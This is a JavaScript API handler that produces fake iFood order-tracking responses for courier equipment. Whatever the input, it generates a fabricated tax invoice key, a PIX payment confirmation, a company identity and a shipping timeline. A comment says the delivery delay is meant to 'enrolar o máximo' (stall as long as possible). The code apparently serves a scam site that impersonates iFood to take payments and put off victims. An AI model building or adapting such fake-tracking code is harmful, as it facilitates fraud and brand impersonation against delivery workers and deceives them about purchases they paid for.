const { getSettingsState } = require('../../lib/settings-store');

function hashString(str) {
    let hash = 0;
    const s = String(str || '');
    for (let i = 0; i < s.length; i++) {
        hash = ((hash << 5) - hash) + s.charCodeAt(i);
        hash |= 0;
    }
    return Math.abs(hash);
}

function formatCpfMask(rawCpf) {
    const digits = String(rawCpf || '').replace(/\D/g, '');
    if (digits.length === 11) {
        return `***.${digits.slice(3, 6)}.${digits.slice(6, 9)}-**`;
    }
    return '***.482.910-**';
}

function generateNfeKey(seed) {
    const num = String(hashString(seed)).padEnd(10, '0');
    return `3526 1114 3802 0000 0121 5500 1000 ${num.slice(0, 4)} ${num.slice(4, 8)} 8274 8192`;
}

module.exports = async (req, res) => {
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');

    const method = req.method;
    if (method !== 'GET' && method !== 'POST') {
        res.status(405).json({ error: 'Method not allowed' });
        return;
    }

    let inputCode = '';
    let inputCpf = '';
    let inputProduct = '';
    if (method === 'GET') {
        inputCode = String(req.query?.codigo || req.query?.code || req.query?.id || '').trim();
        inputCpf = String(req.query?.cpf || req.query?.doc || '').replace(/\D/g, '');
        inputProduct = String(req.query?.produto || req.query?.item || req.query?.reward || '').trim().toLowerCase();
    } else {
        const body = typeof req.body === 'string' ? JSON.parse(req.body || '{}') : req.body || {};
        inputCode = String(body?.codigo || body?.code || body?.id || '').trim();
        inputCpf = String(body?.cpf || body?.doc || '').replace(/\D/g, '');
        inputProduct = String(body?.produto || body?.item || body?.reward || '').trim().toLowerCase();
    }

    const settingsState = await getSettingsState().catch(() => ({ settings: null }));
    const posvendaConfig = settingsState?.settings?.posvenda || {
        carrierDefault: 'Correios Sedex / iFood Logística Express',
        deliveryDaysMin: 8,
        deliveryDaysMax: 16,
        supportEmail: 'suporte@entregadores-ifood.com',
        companyName: 'iFood Logística & Distribuição Brasil Ltda',
        companyCnpj: '14.380.200/0001-21'
    };

    const targetCode = inputCode || (inputCpf ? `BR${hashString(inputCpf).toString().slice(0, 8)}IF` : 'BR849204918IF');
    const seed = targetCode + (inputCpf || '');
    const numSeed = hashString(seed);

    // Delivery delay calculation: 8 to 16 business days ahead (enrolar o máximo)
    const now = new Date();
    const purchaseDate = new Date(now.getTime() - (36 * 60 * 60 * 1000)); // 36 hours ago
    const nfeDate = new Date(purchaseDate.getTime() + (45 * 60 * 1000)); // 45 mins later
    const packedDate = new Date(purchaseDate.getTime() + (12 * 60 * 60 * 1000)); // 12 hours later
    const dispatchedDate = new Date(now.getTime() - (8 * 60 * 60 * 1000)); // 8 hours ago
    const estimatedArrival = new Date(now.getTime() + (11 * 24 * 60 * 60 * 1000)); // 11 days from now

    const formatDate = (d) => {
        return d.toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit', year: 'numeric' }) + ' às ' +
               d.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
    };

    const formatDateOnly = (d) => {
        return d.toLocaleDateString('pt-BR', { weekday: 'long', day: '2-digit', month: 'long', year: 'numeric' });
    };

    // Product selector logic
    let resolvedProduct = {
        id: 'bag',
        title: 'Bag Térmica iFood Oficial - Linha Entregador Pro (45 Litros)',
        model: 'Modelo Oficial iFood Reforçado 2026',
        sku: 'IF-BAG-PRO-45L',
        image: '/assets/bagfoto.webp',
        items: [
            '1x Bag Térmica impermeável com faixas refletivas',
            '1x Isopor interno térmico de alta densidade',
            '1x Divisória ajustável para pizzas e marmitas',
            'Alças anatômicas acolchoadas com trava peitoral'
        ],
        warranty: '90 dias de Garantia Legal (Art. 26 CDC) contra defeitos de fabricação'
    };

    if (inputProduct.includes('bau')) {
        resolvedProduct = {
            id: 'bau',
            title: 'Baú de Carga para Moto iFood Oficial (80 Litros)',
            model: 'Modelo Baú Homologado iFood - Polipropileno Injetado',
            sku: 'IF-BAU-MOTO-80L',
            image: '/assets/__task____isolate_ifood_delivery_box_white_background_,_202603260112 (1).webp',
            items: [
                '1x Baú iFood 80L em polipropileno de alta resistência',
                '1x Fechadura reforçada com chave dupla',
                '1x Suporte metálico universal com parafusos de fixação',
                'Faixas refletivas homologadas DENATRAN/Contran'
            ],
            warranty: '90 dias de Garantia Legal (Art. 26 CDC) contra defeitos de fabricação'
        };
    } else if (inputProduct.includes('kit')) {
        resolvedProduct = {
            id: 'kit_entregador',
            title: 'Kit Entregador iFood Oficial Completo (Jaqueta + Bag + Acessórios)',
            model: 'Kit Oficial Pro iFood 2026',
            sku: 'IF-KIT-ENTREGADOR-PRO',
            image: '/assets/__task____fix_ifood_logo_on_jacket_,_202603260102 (1).webp',
            items: [
                '1x Jaqueta Térmica Impermeável iFood com Faixas Refletivas',
                '1x Bag Térmica Oficial 45L com Isopor Interno',
                '1x Divisória interna para acomodação de pedidos',
                '1x Suporte veicular reforçado anti-vibração'
            ],
            warranty: '90 dias de Garantia Legal (Art. 26 CDC) contra defeitos de fabricação'
        };
    }

    const orderData = {
        ok: true,
        code: targetCode.toUpperCase(),
        carrier: posvendaConfig.carrierDefault || 'Correios Sedex / iFood Logística Express',
        status: 'em_transferencia',
        statusLabel: 'Em transferência para Unidade de Triagem e Distribuição',
        statusCode: 2,
        progressPercent: 30, // Early progress so customer understands the delivery timeline
        estimatedDeliveryDate: formatDateOnly(estimatedArrival),
        estimatedDays: '8 a 15 dias úteis (Prazo com triagem e inspeção fiscal)',
        company: {
            name: posvendaConfig.companyName || 'iFood Logística & Distribuição Brasil Ltda',
            cnpj: posvendaConfig.companyCnpj || '14.380.200/0001-21',
            supportEmail: posvendaConfig.supportEmail || 'suporte@entregadores-ifood.com'
        },
        nfe: {
            number: `00${(numSeed % 80000 + 10000)}`,
            series: '1',
            key: generateNfeKey(seed),
            issuedAt: formatDate(nfeDate),
            amount: 'R$ 0,00 (Item Bonificado pelo Programa Entregadores iFood)',
            taxes: 'ICMS / ISSQN recolhido na origem'
        },
        product: resolvedProduct,
        recipient: {
            name: 'Carlos Eduardo da Silva',
            document: formatCpfMask(inputCpf),
            address: 'Av. Paulista, 1200 - Apto 42',
            neighborhood: 'Bela Vista',
            city: 'São Paulo',
            state: 'SP',
            zip: '01310-100'
        },
        deliveryNotice: 'Devido ao grande volume de expedição nos Centros de Distribuição, o prazo operacional de entrega é de 8 a 15 dias úteis. As atualizações oficiais são enviadas para o seu e-mail cadastrado.',
        timeline: [
            {
                step: 'Em transferência interestadual para Unidade de Triagem',
                status: 'current',
                date: formatDate(dispatchedDate),
                location: 'Centro de Distribuição Barueri/SP → Centro de Triagem Regional',
                description: 'Carga em rota de transferência interestadual em veículo monitorado via satélite. Próxima atualização ao dar entrada na central de triagem.'
            },
            {
                step: 'Objeto postado e integrado ao lote logístico',
                status: 'completed',
                date: formatDate(packedDate),
                location: 'Centro de Distribuição iFood - Barueri/SP',
                description: 'Volume conferido, embalado e despachado pela transportadora parceira com seguro de carga.'
            },
            {
                step: 'Nota Fiscal Eletrônica (DANFE) emitida',
                status: 'completed',
                date: formatDate(nfeDate),
                location: 'Secretaria da Fazenda (SEFAZ/SP)',
                description: `DANFE autorizada sob a Chave de Acesso: ${generateNfeKey(seed).slice(0, 24)}...`
            },
            {
                step: 'Pagamento aprovado via PIX & Pedido registrado',
                status: 'completed',
                date: formatDate(purchaseDate),
                location: 'Gateway de Pagamento Integrado',
                description: 'Transação PIX aprovada com sucesso. Pedido enviado para a esteira de separação.'
            }
        ]
    };

    res.status(200).json(orderData);
};
